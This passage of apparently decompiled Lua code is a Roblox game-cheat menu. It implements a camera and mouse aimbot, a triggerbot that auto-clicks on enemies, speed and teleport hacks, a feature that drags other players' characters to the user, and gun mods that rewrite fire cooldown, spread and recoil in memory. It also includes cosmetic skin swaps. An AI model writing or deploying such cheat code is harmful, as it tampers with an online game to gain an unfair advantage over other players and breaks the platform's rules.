    }):OnChanged(function(p506)
        u480.pJwT = p506
    end)
    u69.Gunmod:AddColorpicker('BTCol', {
        Title = 'BulletTracerColor',
        Default = Color3.fromRGB(255, 255, 255),
    }):OnChanged(function(p507)
        u480.eJdF = p507
    end)
    _Players6[game:GetService('Players').LocalPlayer.Name].PlayerScripts.Modules.ClientReplicatedClasses.ClientFighter.ClientItem.ChildAdded:Connect(function(p508)
        if p508.Name == 'Sound' then
            u501(p508)
        end
    end)
end

a4()

local _RunService7 = game:GetService('RunService')
local _LocalPlayer8 = _Players5.LocalPlayer
local _CurrentCamera6 = _Workspace.CurrentCamera
local u512 = nil
local u513 = false
local u514 = true
local u515 = 350
local u516 = false
local u517 = false

local function u523(p518)
    if not (p518 and p518:FindFirstChild('HumanoidRootPart')) then
        return false
    end

    local _Position2 = _CurrentCamera6.CFrame.Position
    local _Position3 = p518.HumanoidRootPart.Position
    local v521 = RaycastParams.new()

    v521.FilterType = Enum.RaycastFilterType.Blacklist
    v521.FilterDescendantsInstances = {
        _LocalPlayer8.Character,
        _CurrentCamera6,
    }

    local v522 = _Workspace:Raycast(_Position2, _Position3 - _Position2, v521)

    return v522 == nil and true or v522.Instance:IsDescendantOf(p518)
end
local function u525(p524)
    if p524 and p524:FindFirstChild('Humanoid') then
        return p524.Humanoid.Health > 0
    else
        return false
    end
end
local function u527(p526)
    if p526.Character and p526.Character:FindFirstChild('HumanoidRootPart') then
        return p526.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
    else
        return false
    end
end
local function u530()
    if u516 and (getgenv().state == 2 and u512) and (u512.Character and u512.Character:FindFirstChild('HumanoidRootPart')) then
        local _Character4 = _LocalPlayer8.Character

        if _Character4 and _Character4:FindFirstChild('HumanoidRootPart') then
            local v529 = _Character4.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)

            u512.Character.HumanoidRootPart.CFrame = v529
        end
    end
end
local function u536(p531, p532)
    if p532 and p532:FindFirstChild('HumanoidRootPart') then
        local v533 = _CurrentCamera6:WorldToViewportPoint(p532.HumanoidRootPart.Position)

        if v533.Z <= 0 then
            p531.Visible = false
        else
            local v534 = Vector2.new(_CurrentCamera6.ViewportSize.X / 2, _CurrentCamera6.ViewportSize.Y)
            local v535 = Vector2.new(v533.X, v533.Y)

            p531.Color = u523(p532) and Color3.new(1, 0, 0) or Color3.new(0, 0, 1)
            p531.From = v534
            p531.To = v535
            p531.Visible = u517 and true or false
        end
    else
        p531.Visible = false
    end
end
local function u548()
    local _huge3 = math.huge
    local v538 = Vector2.new(_CurrentCamera6.ViewportSize.X / 2, _CurrentCamera6.ViewportSize.Y / 2)
    local v539 = _Players5
    local v540, v541, v542 = pairs(v539:GetPlayers())
    local v543 = nil

    while true do
        local v544

        v542, v544 = v540(v541, v542)

        if v542 == nil then
            break
        end
        if v544 ~= _LocalPlayer8 and v544.Character and (v544.Character:FindFirstChild('HumanoidRootPart') and not u527(v544)) then
            local _Position4 = v544.Character.HumanoidRootPart.Position

            if (_LocalPlayer8.Character.HumanoidRootPart.Position - _Position4).Magnitude <= u515 and u525(v544.Character) then
                local v546 = _CurrentCamera6:WorldToViewportPoint(_Position4)

                if v546.Z > 0 then
                    local _Magnitude6 = (Vector2.new(v546.X, v546.Y) - v538).Magnitude

                    if _Magnitude6 < _huge3 then
                        v543 = v544
                        _huge3 = _Magnitude6
                    end
                end
            end
        end
    end

    return v543
end

local u550 = (function()
    local _Line = Drawing.new('Line')

    _Line.Thickness = 2
    _Line.Transparency = 1
    _Line.Visible = false

    return _Line
end)()

_RunService7.RenderStepped:Connect(function()
    local v551 = u548()

    if u512 then
        u536(u550, u512.Character)

        if u513 and u514 then
            u530()
        end
    elseif v551 and v551.Character then
        u536(u550, v551.Character)
    else
        u550.Visible = false
    end
end)
_UserInputService2.InputBegan:Connect(function(p552, p553)
    if not p553 then
        if p552.UserInputType == Enum.UserInputType.MouseButton1 then
            local v554 = u548()

            if v554 and u523(v554.Character) then
                if u514 then
                    u513 = true
                    u512 = v554
                else
                    u512 = v554

                    u530()

                    u512 = nil
                end
            end
        end
    end
end)
_UserInputService2.InputEnded:Connect(function(p555)
    if p555.UserInputType == Enum.UserInputType.MouseButton1 and u514 then
        u513 = false
        u512 = nil
    end
end)
u69.Nono:AddToggle('kde', {
    Title = 'Melee damage timeout',
    Description = 'Will increase meele damge times, so u can hit more damage with it.',
    Default = false,
}):OnChanged(function() end)
u69.Nono:AddToggle('wallbang', {
    Title = 'Wallbang',
    Description = 'Shoot through walls.',
    Default = false,
}):OnChanged(function(p556)
    if p556 then
        u67:Notify({
            Title = 'Notification',
            Content = 'Not for you to use!',
            SubContent = 'Only for certain users.',
            Duration = 5,
        })
        wait(1)
        _Options.wallbang:SetValue(false)
    end
end)
u69.Nono:AddToggle('Dp', {
    Title = 'Player Drag',
    Description = 'Use this if youre facing cheaters, hold Left Mouse button, it will drag player to you if player is visible.',
    Default = false,
}):OnChanged(function()
    if textLabels and textLabels.tline then
        textLabels.dpaint.Visible = _Options.Dp.Value
    end

    u516 = _Options.Dp.Value
    u517 = _Options.Dp.Value
end)

speedsect = u69.Nono:AddSection('Speed')

local _LocalPlayer9 = game:GetService('Players').LocalPlayer
local _RunService8 = game:GetService('RunService')

getgenv().Multiplier = 0.2

local u559 = false
local u560 = nil

local function u564()
    u560 = _RunService8.Stepped:Connect(function()
        local _Character5 = _LocalPlayer9.Character

        if _Character5 then
            _Character5 = _LocalPlayer9.Character:FindFirstChild('HumanoidRootPart')
        end

        local _Character6 = _LocalPlayer9.Character

        if _Character6 then
            _Character6 = _LocalPlayer9.Character:FindFirstChild('Humanoid')
        end
        if _Character5 and _Character6 then
            local _MoveDirection = _Character6.MoveDirection

            if _MoveDirection.Magnitude > 0 then
                _Character5.CFrame = _Character5.CFrame + _MoveDirection * getgenv().Multiplier
            end
        end
    end)
end
local function u565()
    if u560 then
        u560:Disconnect()

        u560 = nil
    end
end

local _SpeedBoost = u69.Nono:AddToggle('SpeedBoost', {
    Title = 'CFrame Speed v2',
    Default = false,
})
local v567 = _SpeedBoost

_SpeedBoost.OnChanged(v567, function()
    if textLabels and textLabels.bspeed then
        textLabels.bspeed.Visible = _SpeedBoost.Value
    end

    u559 = _SpeedBoost.Value

    if u559 then
        u564()
        warn('CFrame Speed enabled')
    else
        u565()
        warn('CFrame Speed disabled')
    end
end)
u69.Nono:AddSlider('MultiplierSlider', {
    Title = 'Speed Limit',
    Description = 'Adjust speed multiplier (1 = 0.1, 5 = 0.5, etc.)',
    Default = 2,
    Min = 0,
    Max = 10,
    Rounding = 1,
    Callback = function(p568)
        getgenv().Multiplier = p568 / 10
    end,
}):OnChanged(function(p569)
    getgenv().Multiplier = p569 / 10
end)
u69.Nono:AddSection('Gun Mods [Level 8 executor needed]')

local function u576(p570, p571)
    local v572, v573, v574 = pairs(getgc(true))

    while true do
        local v575

        v574, v575 = v572(v573, v574)

        if v574 == nil then
            break
        end
        if type(v575) == 'table' and rawget(v575, p570) then
            v575[p570] = p571
        end
    end
end

if u69 and u69.Nono then
    u69.Nono:AddButton({
        Title = 'Rapid Fire',
        Description = 'Fire Rapidly, but wont work in xeno or solara.',
        Callback = function()
            u576('ShootCooldown', 0)
        end,
    })
    u69.Nono:AddButton({
        Title = 'No Spread',
        Description = 'Bullet Will not spray, but wont work in xeno or solara.',
        Callback = function()
            u576('ShootSpread', 0)
        end,
    })
    u69.Nono:AddButton({
        Title = 'NO Recoil',
        Description = 'Stops the recoil, but wont work in xeno or solara. Ive mead another no recoil use that.',
        Callback = function()
            u576('ShootRecoil', 0)
        end,
    })
end

_RunService8 = game:GetService('RunService')
_CurrentCamera2 = game:GetService('Workspace').CurrentCamera

local _Players7 = game:GetService('Players')

speed = 150
defaultOffsetBehind = 7
defaultOffsetAbove = 5
_LocalPlayer8 = _Players7.LocalPlayer
isMoving = false
moveConnection = nil
tweenDistanceBehind = defaultOffsetBehind
tweenDistanceAbove = defaultOffsetAbove
keybindKey = Enum.KeyCode.N
isKeyPressed = false
eww = u69.Nono:AddSection('Enemy Slider')

local _SlideEnm = u69.Nono:AddToggle('SlideEnm', {
    Title = 'Slide to enemy',
    Description = 'Slides to players behind.',
    Default = false,
})
local v579 = _SlideEnm

_SlideEnm.OnChanged(v579, function() end)

Keybind = u69.Nono:AddKeybind('Keybind', {
    Title = 'KeyBind',
    Mode = 'Toggle',
    Default = 'N',
    Callback = function(p580)
        isKeyPressed = p580
    end,
    ChangedCallback = function(p581)
        keybindKey = p581
    end,
})

function getClosestPlayerToScreenCenter()
    local v582 = nil
    local _huge4 = math.huge
    local v584 = Vector2.new(_CurrentCamera2.ViewportSize.X / 2, _CurrentCamera2.ViewportSize.Y / 2)
    local _Character7 = _LocalPlayer8.Character

    if _Character7 then
        _Character7 = _Character7:FindFirstChild('HumanoidRootPart')
    end
    if not _Character7 then
        return nil
    end

    local v586 = _Players7
    local v587, v588, v589 = ipairs(v586:GetPlayers())

    while true do
        local v590

        v589, v590 = v587(v588, v589)

        if v589 == nil then
            break
        end
        if v590 ~= _LocalPlayer8 and v590.Character and v590.Character:FindFirstChild('HumanoidRootPart') then
            local _HumanoidRootPart7 = v590.Character.HumanoidRootPart

            if (_HumanoidRootPart7.Position - _Character7.Position).Magnitude <= 350 then
                local v592, v593 = _CurrentCamera2:WorldToViewportPoint(_HumanoidRootPart7.Position)

                if v593 then
                    local _Magnitude7 = (Vector2.new(v592.X, v592.Y) - v584).Magnitude

                    if _Magnitude7 < _huge4 then
                        v582 = v590
                        _huge4 = _Magnitude7
                    end
                end
            end
        end
    end

    if v582 then
        u67:Notify({
            Title = 'Slide Notification',
            Content = 'Teleporting to: ' .. v582.Name,
            SubContent = 'Closest player identified',
            Duration = 2,
        })
    else
        u67:Notify({
            Title = 'Slide Notification',
            Content = 'No valid player found to teleport to.',
            SubContent = 'Please try again later.',
            Duration = 2,
        })
    end

    return v582
end
function moveToBackAbovePlayer(p595)
    local _HumanoidRootPart8 = p595.Character.HumanoidRootPart
    local _HumanoidRootPart9 = _LocalPlayer8.Character.HumanoidRootPart

    moveConnection = _RunService8.RenderStepped:Connect(function()
        if isMoving then
            local v598 = _HumanoidRootPart8.Position - _HumanoidRootPart8.CFrame.LookVector * tweenDistanceBehind + Vector3.new(0, tweenDistanceAbove, 0)
            local _unit = (v598 - _HumanoidRootPart9.Position).unit

            if (v598 - _HumanoidRootPart9.Position).magnitude <= 0 then
                _HumanoidRootPart9.CFrame = CFrame.new(v598)
            else
                _HumanoidRootPart9.CFrame = _HumanoidRootPart9.CFrame + _unit * speed * _RunService8.Heartbeat:Wait()
            end
        end
    end)
end
function stopMoving()
    if moveConnection then
        moveConnection:Disconnect()
    end

    isMoving = false
end

_UserInputService2.InputBegan:Connect(function(p600, p601)
    if not p601 then
        local v602 = _SlideEnm.Value and p600.KeyCode == keybindKey and not isMoving and getClosestPlayerToScreenCenter()

        if v602 then
            isMoving = true

            moveToBackAbovePlayer(v602)
        end
        if p600.KeyCode ~= Enum.KeyCode.Up then
            if p600.KeyCode ~= Enum.KeyCode.Down then
                if p600.KeyCode ~= Enum.KeyCode.Right then
                    if p600.KeyCode == Enum.KeyCode.Left then
                        tweenDistanceAbove = math.max(tweenDistanceAbove - 1, 1)
                    end
                else
                    tweenDistanceAbove = tweenDistanceAbove + 1
                end
            else
                tweenDistanceBehind = math.max(tweenDistanceBehind - 1, 1)
            end
        else
            tweenDistanceBehind = tweenDistanceBehind + 1
        end
    end
end)
_UserInputService2.InputEnded:Connect(function(p603)
    if p603.KeyCode == keybindKey then
        stopMoving()
    end
end)

local _LocalPlayer10 = game:GetService('Players').LocalPlayer
local _MuzzleFlashes = _LocalPlayer10.PlayerScripts.Assets:WaitForChild('Misc'):WaitForChild('MuzzleFlashes')
local _Default = _MuzzleFlashes:FindFirstChild('Default')

if _Default then
    local v607 = _Default:Clone()

    v607.Name = 'Muzzle Flash Original'
    v607.Parent = _MuzzleFlashes
end

u69.Skinz:AddDropdown('MuzzleFlashDropdown', {
    Title = 'Fire Effect [Bullet]',
    Values = {
        'None',
        'Aqua Burst',
        'Demon Shorty',
        'Demon Uzi',
        'Dynamite Gun',
        'Electro Rifle',
        'Exogun',
        'Singularity',
        'Wondergun',
    },
    Multi = false,
    Default = 1,
}):OnChanged(function(p608)
    local v609 = _MuzzleFlashes:FindFirstChild('Default') or _MuzzleFlashes:FindFirstChild('Muzzle Flash Original')

    if v609 then
        v609:Destroy()
    end
    if p608 == 'None' then
        local _MuzzleFlashOriginal = _MuzzleFlashes:FindFirstChild('Muzzle Flash Original')

        if _MuzzleFlashOriginal then
            local v611 = _MuzzleFlashOriginal:Clone()

            v611.Parent = _MuzzleFlashes
            v611.Name = 'Default'
        end
    else
        local v612 = _MuzzleFlashes:FindFirstChild(p608)

        if v612 then
            local v613 = v612:Clone()

            v613.Parent = _MuzzleFlashes
            v613.Name = 'Default'
        end
    end
end)

local _Misc = _LocalPlayer10.PlayerScripts.Assets:WaitForChild('Misc')
local _BurningEffects = _Misc:WaitForChild('BurningEffects')
local _FireHitboxes = _Misc:WaitForChild('FireHitboxes')
local _Default2 = _BurningEffects:FindFirstChild('Default')

if _Default2 then
    local v618 = _Default2:Clone()

    v618.Name = 'Burning Effect Original'
    v618.Parent = _BurningEffects
end

local _Default3 = _FireHitboxes:FindFirstChild('Default')

if _Default3 then
    local v620 = _Default3:Clone()

    v620.Name = 'Fire Hitbox Original'
    v620.Parent = _FireHitboxes
end

u69.Skinz:AddDropdown('FireEffectDropdown', {
    Title = 'Moltov Fire ',
    Values = {
        'None',
        'Hexxed Candle [Purple]',
    },
    Multi = false,
    Default = 1,
}):OnChanged(function(p621)
    local v622 = _BurningEffects:FindFirstChild('Default') or _BurningEffects:FindFirstChild('Burning Effect Original')
    local v623 = _FireHitboxes:FindFirstChild('Default') or _FireHitboxes:FindFirstChild('Fire Hitbox Original')

    if v622 then
        v622:Destroy()
    end
    if v623 then
        v623:Destroy()
    end
    if p621 == 'Hexxed Candle' then
        local _HexxedCandle = _BurningEffects:FindFirstChild('Hexxed Candle')
        local _HexxedCandle2 = _FireHitboxes:FindFirstChild('Hexxed Candle')

        if _HexxedCandle then
            local v626 = _HexxedCandle:Clone()

            v626.Name = 'Default'
            v626.Parent = _BurningEffects
        end
        if _HexxedCandle2 then
            local v627 = _HexxedCandle2:Clone()

            v627.Name = 'Default'
            v627.Parent = _FireHitboxes
        end
    else
        local _BurningEffectOriginal = _BurningEffects:FindFirstChild('Burning Effect Original')
        local _FireHitboxOriginal = _FireHitboxes:FindFirstChild('Fire Hitbox Original')

        if _BurningEffectOriginal then
            local v630 = _BurningEffectOriginal:Clone()

            v630.Name = 'Default'
            v630.Parent = _BurningEffects
        end
        if _FireHitboxOriginal then
            local v631 = _FireHitboxOriginal:Clone()

            v631.Name = 'Default'
            v631.Parent = _FireHitboxes
        end
    end
end)
u69.Skinz:AddSection('Gun Skin')

local _LocalPlayer11 = game:GetService('Players').LocalPlayer
local _Assets = _LocalPlayer11.PlayerScripts.Assets
local _ViewModels = _Assets:WaitForChild('ViewModels')
local _Throwables = _Assets:WaitForChild('Throwables')
local u636 = {
    'Festive Skin Case',
    'Other',
    'Skin Case',
    'Skin Case 2',
    'Spooky Skin Case',
}

local function v641(p637, p638, p639)
    if p637 then
        local v640 = p637:Clone()

        v640.Name = p639
        v640.Parent = p638
    end
end
local function u651(p642, p643)
    local v644 = p643:FindFirstChild(p642)

    if v644 then
        return v644
    end
    if p643 == _ViewModels then
        local v645, v646, v647 = ipairs(u636)

        while true do
            local v648

            v647, v648 = v645(v646, v647)

            if v647 == nil then
                break
            end

            local v649 = _ViewModels:FindFirstChild(v648)

            if v649 then
                local v650 = v649:FindFirstChild(p642)

                if v650 then
                    return v650
                end
            end
        end
    end

    return nil
end
local function u659(p652, p653, p654, p655)
    local v656 = p654:FindFirstChild(p652)

    if v656 then
        v656:Destroy()
    end

    local v657 = u651(p653 == 'None' and p655 and p655 or p653, p654)

    if v657 then
        local v658 = v657:Clone()

        v658.Name = p652
        v658.Parent = p654
    end
end
local function v665(p660, p661, p662, p663)
    u69.Skinz:AddDropdown(p660 .. 'Dropdown', {
        Title = p661,
        Values = p662,
        Multi = false,
        Default = 1,
    }):OnChanged(function(p664)
        u659(p660, p664, p663, p660 .. ' Original')
    end)
end

local v666, v667, v668 = ipairs({
    {
        'Assault Rifle',
        'Assault Rifle Original',
        {
            'None',
            'AUG',
            'AK-47',
            'Boneclaw Rifle',
            'AKEY-47',
        },
    },
    {
        'Energy Rifle',
        'Energy Rifle Original',
        {
            'None',
            'Apex Rifle',
            'Hacker Rifle',
            '2025 Energy Rifle',
        },
    },
    {
        'Battle Axe',
        'Battle Axe Original',
        {
            'None',
            'The Shred',
            'Nordic Axe',
        },
    },
    {
        'Freeze Ray',
        'Freeze Ray Original',
        {
            'None',
            'Temporal Ray',
            'Bubble Ray',
        },
    },
    {
        'War Horn',
        'War Horn Original',
        {
            'None',
            'Trumpet',
            'Mammoth Horn',
        },
    },
    {
        'Handgun',
        'Handgun Original',
        {
            'None',
            'Blaster',
            'Hand Gun',
            'Pixel Handgun',
            'Pumpkin Handgun',
            'Gingerbread Handgun',
        },
    },
    {
        'Riot Shield',
        'Riot Shield Original',
        {
            'None',
            'Door',
            'Sled',
        },
    },
    {
        'Fists',
        'Fists Original',
        {
            'None',
            'Festive Fists',
            'Pumpkin Claws',
            'Brass Knuckles',
            'Boxing Gloves',
        },
    },
    {
        'Revolver',
        'Revolver Original',
        {
            'None',
            'Boneclaw Revolver',
        },
    },
    {
        'Knife',
        'Knife Original',
        {
            'None',
            'Candy Cane',
            'Karambit',
            'Chancla',
            'Machete',
        },
    },
    {
        'Bow',
        'Bow Original',
        {
            'None',
            'Bat Bow',
            'Compound Bow',
            'Raven Bow',
        },
    },
    {
        'Shorty',
        'Shorty Original',
        {
            'None',
            'Lovely Shorty',
            'Not So Shorty',
            'Too Shorty',
            'Demon Shorty',
        },
    },
    {
        'Burst Rifle',
        'Burst Rifle Original',
        {
            'None',
            'Electro Rifle',
            'Aqua Burst',
            'Pixel Burst',
            'Spectral Burst',
        },
    },
    {
        'RPG',
        'RPG Original',
        {
            'None',
            'Nuke Launcher',
        },
    },
    {
        'Shotgun',
        'Shotgun Original',
        {
            'None',
            'Balloon Shotgun',
            'Hyper Shotgun',
        },
    },
    {
        'Sniper',
        'Sniper Original',
        {
            'None',
            'Pixel Sniper',
            'Hyper Sniper',
            'Keyper',
            'Eyething Sniper',
        },
    },
})
local u669 = _CoreGui2
local u670 = u659
local v671 = _RunService8
local u672 = _Workspace
local u673 = _ViewModels

while true do
    local v674, v675 = v666(v667, v668)

    if v674 == nil then
        break
    end

    v668 = v674

    local v676 = u673:FindFirstChild(v675[1])

    if v676 then
        v641(v676, u673, v675[2])
        v665(v675[1], v675[1], v675[3], u673)
    end
end

v641(u673:FindFirstChild('Grenade'), u673, 'Grenade Original')
v641(_Throwables:FindFirstChild('Grenade'), _Throwables, 'Grenade Original')
v641(u673:FindFirstChild('Molotov'), u673, 'Molotov Original')
v641(_Throwables:FindFirstChild('Molotov'), _Throwables, 'Molotov Original')
v665('Grenade', 'Grenade', {
    'None',
    'Whoopee Cushion',
    'Water Balloon',
    'Soul Grenade',
}, u673)
v665('Molotov', 'Molotov', {
    'None',
    'Coffee',
    'Hexxed Candle',
    'Torch',
}, u673)
v641(u673:FindFirstChild('Scythe'), u673, 'Scythe Original')
v641(_Throwables:FindFirstChild('Scythe'), _Throwables, 'Scythe Original')
u69.Skinz:AddDropdown('ScytheDropdown', {
    Title = 'Scythe',
    Values = {
        'None',
        'Keythe',
        'Anchor',
    },
    Multi = false,
    Default = 1,
}):OnChanged(function(p677)
    u670('Scythe', p677, u673, 'Scythe Original')
    u670('Scythe', p677, _Throwables, 'Scythe Original')
end)

local _Throwables2 = _LocalPlayer11.PlayerScripts.Assets:WaitForChild('Throwables')
local _SmokeClouds = _LocalPlayer11.PlayerScripts.Assets.Misc.SmokeClouds

local function u684(p680, p681, p682)
    if p680 then
        local v683 = p680:Clone()

        v683.Name = p682
        v683.Parent = p681
    end
end
local function u688(p685, p686)
    local v687 = p685:FindFirstChild(p686)

    if v687 then
        v687:Destroy()
    end
end

u684(u673:FindFirstChild('Smoke Grenade'), u673, 'Smoke Grenade Original')

local v689 = _Throwables2

u684(_Throwables2.FindFirstChild(v689, 'Smoke Grenade'), _Throwables2, 'Smoke Grenade Original')

local v690 = _SmokeClouds

u684(_SmokeClouds.FindFirstChild(v690, 'Default'), _SmokeClouds, 'Smoke Grenade Original')
u69.Skinz:AddDropdown('SmokeGrenadeDropdown', {
    Title = 'Smoke Grenade ',
    Values = {
        'None',
        'Eyeball',
        'Balance',
    },
    Multi = false,
    Default = 3,
}):OnChanged(function(p691)
    u688(u673, 'Smoke Grenade')
    u688(u673, 'Smoke Grenade Original')
    u688(_Throwables2, 'Smoke Grenade')
    u688(_Throwables2, 'Smoke Grenade Original')
    u688(_SmokeClouds, 'Default')
    u688(_SmokeClouds, 'Smoke Grenade Original')

    local v692 = p691 == 'None' and ('Smoke Grenade Original' or p691) or p691

    u684(u673:FindFirstChild(v692), u673, 'Smoke Grenade')
    u684(_Throwables2:FindFirstChild(v692), _Throwables2, 'Smoke Grenade')
    u684(_SmokeClouds:FindFirstChild(v692), _SmokeClouds, 'Default')
end)

function InitializeAimbotSystem3()
    local _Workspace2 = game:GetService('Workspace')
    local _UserInputService3 = game:GetService('UserInputService')
    local _Lighting2 = game:GetService('Lighting')
    local _Players8 = game:GetService('Players')
    local _RunService9 = game:GetService('RunService')
    local _LocalPlayer12 = _Players8.LocalPlayer
    local u699 = {
        Enabled = false,
        HitChance = 100,
        NotWorkIfFlashed = true,
    }
    local u700 = false
    local u701 = nil
    local _MouseButton22 = Enum.UserInputType.MouseButton2

    local function u716()
        local v703 = _UserInputService3:GetMouseLocation()
        local _huge5 = math.huge
        local v705 = _Players8
        local v706, v707, v708 = pairs(v705:GetPlayers())
        local v709 = nil

        while true do
            local v710

            v708, v710 = v706(v707, v708)

            if v708 == nil then
                break
            end

            local _Character8 = v710.Character
            local _Character9 = v710.Character

            if _Character9 then
                _Character9 = v710.Character:FindFirstChild('HumanoidRootPart')
            end
            if v710 ~= _LocalPlayer12 and _Character8 and (_Character9 and not _Character9:FindFirstChild('TeammateLabel')) then
                local v713, v714 = _Workspace2.CurrentCamera:WorldToViewportPoint(_Character9.Position)
                local v715 = v714 and (Vector2.new(v713.X, v713.Y) - v703).Magnitude or math.huge

                if v715 < _huge5 then
                    v709 = v710
                    _huge5 = v715
                end
            end
        end

        return v709
    end
    local function u719(p717)
        local _Character10 = p717.Character

        if _Character10 then
            _Character10 = p717.Character:FindFirstChild('Head')
        end

        return _Character10
    end
    local function u721(p720)
        _Workspace2.CurrentCamera.CFrame = CFrame.lookAt(_Workspace2.CurrentCamera.CFrame.Position, p720.Position)
    end
    local function u723()
        u701 = u716()

        while u700 and (u699.Enabled and u701) do
            if getgenv().state ~= 2 then
                u700 = false

                return
            end

            local v722 = (math.random(0, 100) <= u699.HitChance and not (u699.NotWorkIfFlashed and _Lighting2:FindFirstChild('Flashbang')) and true or false) and u719(u701)

            if v722 then
                u721(v722)
            end

            _RunService9.RenderStepped:Wait()
        end
    end

    _UserInputService3.InputBegan:Connect(function(p724, p725)
        if not p725 and (p724.KeyCode == _MouseButton22 or p724.UserInputType == _MouseButton22) then
            u700 = true

            task.spawn(u723)
        end
    end)
    _UserInputService3.InputEnded:Connect(function(p726)
        if p726.KeyCode == _MouseButton22 or p726.UserInputType == _MouseButton22 then
            u701 = nil
            u700 = false
        end
    end)

    cas = u69.AimTab:AddSection('Camera Aimbot')

    u69.AimTab:AddKeybind('CamAimKeybind3', {
        Title = 'Cam lock KeyBind',
        Mode = 'Toggle',
        Default = 'MouseRight',
        Callback = function(_) end,
        ChangedCallback = function(p727)
            _MouseButton22 = p727
        end,
    })

    local _CamToggle3 = u69.AimTab:AddToggle('CamToggle3', {
        Title = 'Cam Aimbo',
        Description = '\u{25cf} No Detection\n\u{25cf} Less Missfire',
        Default = false,
    })
    local v729 = _CamToggle3

    _CamToggle3.OnChanged(v729, function()
        if textLabels and textLabels.textLabel3 then
            textLabels.textLabel3.Visible = _Options.CamToggle3.Value

            fadeText(textLabels.textLabel3, _Options.CamToggle3.Value)
            alignTextLabels()
        end

        u699.Enabled = _CamToggle3.Value
    end)

    local _AimMob3 = u69.AimTab:AddToggle('AimMob3', {
        Title = 'Mobile Aimbot',
        Description = 'For Mobile, also works on computer. Set FOV to 120. (Must)',
        Default = false,
    })
    local v731 = _AimMob3

    _AimMob3.OnChanged(v731, function()
        getgenv().MobileAimbot = _AimMob3.Value
    end)
end

InitializeAimbotSystem3()

local _TbotToggle = u69.AimTab:AddToggle('TbotToggle', {
    Title = 'Triggerbot',
    Description = 'Auto shoots when enemy on point.',
    Default = false,
})
local _LocalPlayer13 = game:GetService('Players').LocalPlayer
local _CurrentCamera7 = u672.CurrentCamera
local u735 = false

_TbotToggle:OnChanged(function()
    u735 = _Options.TbotToggle.Value
end)

local function u742()
    local _Position5 = _CurrentCamera7.CFrame.Position
    local v737 = _CurrentCamera7.CFrame.LookVector * 1000
    local v738 = RaycastParams.new()
    local _Blacklist = Enum.RaycastFilterType.Blacklist

    v738.FilterDescendantsInstances = {
        _LocalPlayer13.Character,
    }
    v738.FilterType = _Blacklist

    local v740 = workspace:Raycast(_Position5, v737, v738)

    if v740 then
        v740 = v740.Instance:FindFirstAncestorOfClass('Model')
    end

    local v741 = v740 and v740:FindFirstChild('Humanoid')

    if v741 then
        v741 = v740.Name ~= _LocalPlayer13.Name
    end

    return v741
end

v671.RenderStepped:Connect(function()
    if u735 and (getgenv().state == 2 and u742()) then
        mouse1click()
    end
end)

mas = u69.AimTab:AddSection('Mouse Aimbot')

function InitializeAimbot2()
    local u743 = false
    local _MouseButton23 = Enum.UserInputType.MouseButton2
    local u745 = 'Head'
    local u746 = 100
    local u747 = 5
    local u748 = false
    local u749 = false
    local u750 = 0
    local u751 = 0
    local u752 = false
    local u753 = false
    local u754 = nil
    local _RunService10 = game:GetService('RunService')
    local _UserInputService4 = game:GetService('UserInputService')
    local _Players9 = game:GetService('Players')
    local _LocalPlayer14 = _Players9.LocalPlayer
    local _CurrentCamera8 = workspace.CurrentCamera

    local function u771()
        local v760 = u746
        local v761 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
        local v762 = _Players9
        local v763, v764, v765 = pairs(v762:GetPlayers())
        local v766 = nil

        while true do
            local v767

            v765, v767 = v763(v764, v765)

            if v765 == nil then
                break
            end
            if v767 ~= _LocalPlayer14 and v767.Character and v767.Character:FindFirstChild(u745) then
                local v768, v769 = _CurrentCamera8:WorldToViewportPoint(v767.Character[u745].Position)

                if v769 then
                    local _Magnitude8 = (Vector2.new(v768.X, v768.Y) - v761).Magnitude

                    if _Magnitude8 < v760 then
                        v766 = v767
                        v760 = _Magnitude8
                    end
                end
            end
        end

        return v766
    end
    local function v782()
        if u743 then
            if getgenv().state == 2 then
                if _MouseButton23 ~= Enum.UserInputType.MouseButton2 then
                    if not _UserInputService4:IsKeyDown(_MouseButton23) then
                        u754 = nil

                        return
                    end
                elseif not _UserInputService4:IsMouseButtonPressed(_MouseButton23) then
                    u754 = nil

                    return
                end
                if u754 and u752 and u754.Character and u754.Character:FindFirstChild(u745) then
                    local v772 = _CurrentCamera8:WorldToViewportPoint(u754.Character[u745].Position)
                    local v773 = Vector2.new(v772.X, v772.Y)
                    local v774 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
                    local v775 = v773 - v774
                    local v776 = Vector2.new(v774.X + v775.X / (u747 + 1), v774.Y + v775.Y / (u747 + 1)) - Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)

                    mousemoverel(v776.X, v776.Y)
                else
                    u754 = u771()

                    if u754 then
                        local v777 = _CurrentCamera8:WorldToViewportPoint(u754.Character[u745].Position)
                        local v778 = Vector2.new(v777.X, v777.Y)
                        local v779 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
                        local v780 = v778 - v779
                        local v781 = Vector2.new(v779.X + v780.X / (u747 + 1), v779.Y + v780.Y / (u747 + 1)) - Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)

                        mousemoverel(v781.X, v781.Y)
                    end
                end
            else
                return
            end
        else
            return
        end
    end

    local _Circle4 = Drawing.new('Circle')

    _Circle4.Color = Color3.fromRGB(255, 255, 255)
    _Circle4.Thickness = 1
    _Circle4.Transparency = 1
    _Circle4.Filled = false

    local function v785()
        if u753 then
            local v784 = _UserInputService4:GetMouseLocation()

            _Circle4.Radius = u746
            _Circle4.Position = Vector2.new(v784.X, v784.Y)
            _Circle4.Visible = true
        else
            _Circle4.Visible = false
        end
    end

    local v791 = {
        {
            'EnableAimbot2',
            'Enable',
            false,
            function(p786)
                u743 = p786
            end,
        },
        {
            'ShowFOVCheckbox2',
            'Show FOV',
            false,
            function(p787)
                u753 = p787
            end,
        },
        {
            'SmoothnessCheckbox2',
            'Smoothness',
            false,
            function(p788)
                u748 = p788
            end,
        },
        {
            'EnablePrediction2',
            'Enable Prediction',
            false,
            function(p789)
                u749 = p789
            end,
        },
        {
            'StickyAimCheckbox2',
            'Sticky Aim',
            false,
            function(p790)
                u752 = p790
            end,
        },
    }
    local v792, v793, v794 = ipairs(v791)
    local u795 = u747
    local u796 = u746
    local u797 = u745
    local u798 = _MouseButton23

    while true do
